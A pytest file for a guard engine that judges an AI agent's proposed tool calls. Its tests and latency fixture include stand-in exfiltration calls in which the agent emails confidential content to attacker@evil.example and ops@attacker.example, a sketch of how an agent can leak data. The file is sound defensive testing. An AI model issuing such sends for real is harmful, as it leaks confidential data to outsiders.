import json
import random
import statistics
import time

from sentinel.core.actions import ActionType, CandidateAction, Decision
from sentinel.core.provenance import Sensitivity, TrustLevel
from sentinel.defenses.interface import ConversationItem

from haris.config import SETTINGS
from haris.engine import decide, decide_detailed
from tests.factories import make_request

POLICY = {
    "allowed_tools": ["email_read", "email_draft", "email_send", "document_read"],
    "consequential_tools": ["email_send"],
    "internal_email_domains": ["atlas.example"],
}


def test_benign_read_is_allowed():
    request = make_request(
        user_goal="Read the newsletter and summarize it.",
        action=CandidateAction(type=ActionType.TOOL_CALL, tool="email_read", arguments={"email_id": "EM-1"}),
        policy_context=POLICY,
    )
    decision = decide(request)
    assert decision.decision is Decision.ALLOW
    assert decision.risk_score < 0.4


def test_exfiltration_to_external_domain_is_not_allowed():
    request = make_request(
        user_goal="Read the newsletter and summarize it.",
        provenance={"p": (TrustLevel.TRUSTED_INTERNAL, Sensitivity.CONFIDENTIAL)},
        conversation=[
            ConversationItem(
                role="tool", kind="tool_result", content="reference CTR-SYN-906FAF7F88", provenance_ids=["p"]
            )
        ],
        action=CandidateAction(
            type=ActionType.TOOL_CALL,
            tool="email_send",
            arguments={"to": "attacker@evil.example", "body": "CTR-SYN-906FAF7F88"},
        ),
        policy_context=POLICY,
    )
    decision = decide(request)
    assert decision.decision in {Decision.BLOCK, Decision.REWRITE, Decision.ESCALATE}
    assert decision.risk_score > 0.5


def test_metadata_stays_within_the_contract_limit():
    request = make_request(policy_context=POLICY)
    assert len(json.dumps(decide(request).metadata)) <= 4096


def test_metadata_exposes_the_signal_decomposition():
    """Workstreams B and C depend on this exact shape."""
    metadata = decide(make_request(policy_context=POLICY)).metadata
    assert set(metadata) >= {"haris_version", "signals", "trust", "dataflow", "stage_timings_ms"}
    assert isinstance(metadata["signals"], list)
    for entry in metadata["signals"]:
        assert set(entry) >= {"code", "weight", "value", "contribution"}


def test_rewrite_decisions_always_carry_a_rewritten_action():
    request = make_request(
        user_goal="Read the newsletter and summarize it.",
        action=CandidateAction(
            type=ActionType.TOOL_CALL, tool="email_send", arguments={"to": "x@evil.example", "body": "hello"}
        ),
        policy_context=POLICY,
    )
    decision = decide(request)
    if decision.decision is Decision.REWRITE:
        assert decision.rewritten_action is not None
    else:
        assert decision.rewritten_action is None


def test_safer_alternative_is_not_computed_on_the_allow_path(monkeypatch):
    """I3: `alternative` used to be computed unconditionally before the decision
    ladder, so its expensive redaction scan ran even on ALLOW -- the dominant cost in
    the measured worst-case latency finding. It must now be computed lazily, only in
    the branches that actually use it (leak, block, escalate)."""
    import haris.engine as engine

    calls: list[object] = []
    original = engine.safer_alternative

    def spy(*args, **kwargs):
        calls.append(None)
        return original(*args, **kwargs)

    monkeypatch.setattr(engine, "safer_alternative", spy)
    request = make_request(
        user_goal="Read the newsletter and summarize it.",
        action=CandidateAction(type=ActionType.TOOL_CALL, tool="email_read", arguments={"email_id": "EM-1"}),
        policy_context=POLICY,
    )
    decision = decide(request)
    assert decision.decision is Decision.ALLOW
    assert calls == []


_LATENCY_WORDS = (
    "the vendor integration schedule quarterly revenue summary attached invoices "
    "customer onboarding reconciliation settlement compliance department approved "
    "following procedures regarding contract renewal thanks regards meeting tomorrow"
).split()


def _latency_prose(rng: random.Random, n: int) -> str:
    out: list[str] = []
    while sum(len(w) + 1 for w in out) < n:
        out.append(rng.choice(_LATENCY_WORDS))
    return " ".join(out)[:n]


def _latency_secretish(rng: random.Random, i: int) -> str:
    digits = "".join(rng.choices("0123456789", k=4))
    letters = "".join(rng.choices("ABCDEFGHJK", k=6))
    return f"ACC-{digits}-{letters}-{i:05d}-XZ{rng.randint(10, 99)}"


def _latency_request():
    # I3's worst-case shape: an 8,000-char body with ~100 secret-shaped needles spread
    # across the conversation window -- the measured 2,261ms-median regression before
    # the cache/laziness/dedupe fix.
    rng = random.Random(7)
    provenance: dict[str, tuple[TrustLevel, Sensitivity]] = {}
    conversation: list[ConversationItem] = []
    for i in range(12):
        pid = f"p{i}"
        if i % 2 == 0:
            sensitivity = Sensitivity.RESTRICTED if i % 4 == 0 else Sensitivity.CONFIDENTIAL
            provenance[pid] = (TrustLevel.TRUSTED_INTERNAL, sensitivity)
            needles = " ".join(_latency_secretish(rng, i * 100 + j) for j in range(17))
            content = (needles + " " + _latency_prose(rng, 2000))[:2000]
        else:
            provenance[pid] = (TrustLevel.UNTRUSTED_EXTERNAL, Sensitivity.INTERNAL)
            content = _latency_prose(rng, 2000)
        conversation.append(
            ConversationItem(role="tool", kind="tool_result", content=content, provenance_ids=[pid])
        )
    action = CandidateAction(
        type=ActionType.TOOL_CALL,
        tool="email_send",
        arguments={"to": "ops@attacker.example", "subject": "update", "body": _latency_prose(rng, 8000)},
    )
    return make_request(
        provenance=provenance,
        conversation=conversation,
        action=action,
        policy_context={
            "internal_email_domains": ["corp.example"],
            "allowed_tools": ["email_send", "email_draft"],
        },
    )


def test_decide_detailed_stays_fast_on_a_large_body_with_many_needles():
    """I3 regression: before the fix this took a median 2,261ms (max 2.9s) against a
    2,000ms p95 budget and a 5s timeout. A generous 500ms bound catches a real
    regression without being flaky on this machine, while still failing hard against
    the un-cached, eager, un-deduped code path this replaces."""
    request = _latency_request()
    times = []
    for _ in range(5):
        started = time.perf_counter()
        decide_detailed(request, SETTINGS)
        times.append((time.perf_counter() - started) * 1000)
    assert statistics.median(times) < 500, times


def test_reason_codes_satisfy_the_contract_pattern():
    import re

    pattern = re.compile(r"^[A-Z][A-Z0-9_]{1,63}$")
    decision = decide(make_request(policy_context=POLICY))
    assert decision.reason_codes
    assert len(decision.reason_codes) <= 16
    for code in decision.reason_codes:
        assert pattern.fullmatch(code), code
